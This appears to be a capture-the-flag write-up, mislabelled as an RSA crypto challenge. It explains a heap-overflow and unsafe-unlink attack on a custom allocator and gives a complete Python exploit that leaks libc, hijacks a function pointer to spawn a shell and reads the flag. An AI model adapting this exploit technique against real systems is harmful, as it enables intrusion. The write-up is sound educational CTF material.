# crypto - baby-rsa

Solved by : G10D

Flag: `EH4X{unf0rtun4t3ly_th3_lul_1s_0n_m3}`

The binary implements a custom heap allocator (“lulocator”) with options to allocate, write, free, and execute a function via a global runner pointer.

The bug is in `write()` it allows writing `size + 0x18` bytes into a chunk, causing a heap overflow into the next chunk.

By freeing a chunk and then overflowing into it, we overwrite its fd and bk pointers (free list pointers).

When the allocator reuses that corrupted chunk, it performs an unsafe unlink, which lets us overwrite the global runner pointer.

We then craft a fake object in heap memory:

`+0x10` → address of `system`
`+0x28` → `"/bin/sh"`

Calling run() executes:

`system("/bin/sh")`


This gives a shell and allows reading the flag.

Heap overflow → unsafe unlink → function pointer hijack → shell.
```python3
#!/usr/bin/env python3
import socket, re, struct, time

HOST = "chall.ehax.in"
PORT = 40137

RUNNER_GLOB = 0x404940  # global runner pointer in .bss

# Offsets from the provided libc.so.6 you uploaded
# nm -D libc.so.6 | grep _IO_2_1_stdout_
STDOUT_OFF = 0x21b780
# nm -D libc.so.6 | grep ' system@@'
SYSTEM_OFF = 0x50d70

def p64(x): return struct.pack("<Q", x)

class IO:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port))
        self.s.settimeout(2.0)
        self.buf = b""

    def recv(self, n=4096):
        try:
            d = self.s.recv(n)
            if not d:
                return b""
            return d
        except socket.timeout:
            return b""

    def recvuntil(self, token: bytes, timeout=2.0):
        end = time.time() + timeout
        while token not in self.buf and time.time() < end:
            self.buf += self.recv(4096)
        if token not in self.buf:
            raise TimeoutError(self.buf)
        out, self.buf = self.buf.split(token, 1)
        return out + token

    def recvuntil_any(self, tokens, timeout=2.0):
        end = time.time() + timeout
        while time.time() < end:
            for t in tokens:
                if t in self.buf:
                    return t
            self.buf += self.recv(4096)
        raise TimeoutError(self.buf)

    def send(self, b: bytes):
        self.s.sendall(b)

    def sendline(self, b: bytes):
        self.send(b + b"\n")

def cmd(io, n):
    io.sendline(str(n).encode())

def menu_wait(io):
    io.recvuntil(b"> ")

def do_new(io, sz):
    cmd(io, 1)
    io.recvuntil(b"size: ")
    io.sendline(str(sz).encode())
    line = io.recvuntil(b"\n")
    m = re.search(rb"index=(\d+)", line)
    if not m:
        raise RuntimeError("new() parse failed: " + repr(line))
    idx = int(m.group(1))
    menu_wait(io)
    return idx

def do_info(io, idx):
    cmd(io, 4)
    io.recvuntil(b"idx: ")
    io.sendline(str(idx).encode())
    line = io.recvuntil(b"\n")
    menu_wait(io)
    return line

def do_set_runner(io, idx):
    cmd(io, 5)
    io.recvuntil(b"idx: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"\n")
    menu_wait(io)

def do_delete(io, idx):
    cmd(io, 3)
    io.recvuntil(b"idx: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"\n")
    menu_wait(io)

def do_write(io, idx, length, data):
    cmd(io, 2)
    io.recvuntil(b"idx: ")
    io.sendline(str(idx).encode())

    tok = io.recvuntil_any([b"bad idx", b"len: "], timeout=1.0)
    if tok == b"bad idx":
        io.recvuntil(b"\n")
        menu_wait(io)
        return False

    io.sendline(str(length).encode())
    io.recvuntil(b"data: ")
    io.send(data)
    if len(data) < length:
        io.send(b"\x00" * (length - len(data)))
    io.recvuntil(b"\n")
    menu_wait(io)
    return True

def do_run(io):
    cmd(io, 6)
    # after shell, prompt may not return; just give it a moment
    time.sleep(0.15)

def main():
    io = IO(HOST, PORT)
    menu_wait(io)

    # 1) Heap grooming
    A = do_new(io, 0x100)  # chunk A (we'll store fake runner in its data)
    P = do_new(io, 0x100)  # chunk P (we will free this, then corrupt fd/bk)
    C = do_new(io, 0x100)  # guard chunk to prevent coalesce

    # 2) Leaks
    la = do_info(io, A)
    lp = do_info(io, P)

    a_addr = int(re.search(rb"addr=0x([0-9a-fA-F]+)", la).group(1), 16)
    p_addr = int(re.search(rb"addr=0x([0-9a-fA-F]+)", lp).group(1), 16)
    stdout_addr = int(re.search(rb"out=0x([0-9a-fA-F]+)", la).group(1), 16)

    libc_base = stdout_addr - STDOUT_OFF
    system_addr = libc_base + SYSTEM_OFF

    # 3) Make runner point to P, then free P (runner stays stale == P)
    do_set_runner(io, P)
    do_delete(io, P)

    # 4) Build fake runner in A's data
    fake_runner = a_addr + 0x28  # start of A's data

    # unlink() integrity checks need:
    #   *(bk)   == P
    #   *(fd+8) == P
    #
    # We set:
    #   fd = RUNNER_GLOB - 8     => fd+8 == RUNNER_GLOB (which currently holds P)
    #   bk = fake_runner         => *(fake_runner) we set to P in our payload

    fd = RUNNER_GLOB - 8
    bk = fake_runner

    # Fake object layout at fake_runner:
    # +0x00: must be P (for *(bk) == P check)
    # +0x10: system
    # +0x28: "/bin/sh\x00"
    fake  = p64(p_addr)          # qword0 = P (unlink check)
    fake += p64(0)               # qword1
    fake += p64(system_addr)     # +0x10 function pointer
    fake += p64(0)               # +0x18 (unused)
    fake += p64(0x100)           # +0x20 (len-ish, not important)
    fake  = fake.ljust(0x28, b"\x00")
    fake += b"/bin/sh\x00"
    fake  = fake.ljust(0x108, b"A")  # pad until we hit freed P's fd/bk
    overflow = fake + p64(fd) + p64(bk)

    # write() allows max size+0x18 = 0x118 here, and our payload is exactly 0x118
    assert len(overflow) == 0x118

    do_write(io, A, len(overflow), overflow)

    # 5) Trigger unlink by allocating same size -> allocator unlinks corrupted free chunk P
    _X = do_new(io, 0x100)

    # Now RUNNER_GLOB == fake_runner. run() calls system(fake_runner+0x28).
    do_run(io)

    # 6) Shell -> read flag (paths vary; try common ones)
    io.sendline(b"cat flag.txt; cat /flag.txt; cat ./flag.txt; echo __END__")
    out = b""
    end = time.time() + 2.0
    while b"__END__" not in out and time.time() < end:
        out += io.recv(4096)
    print(out.decode(errors="replace"))

if __name__ == "__main__":
    main()
```
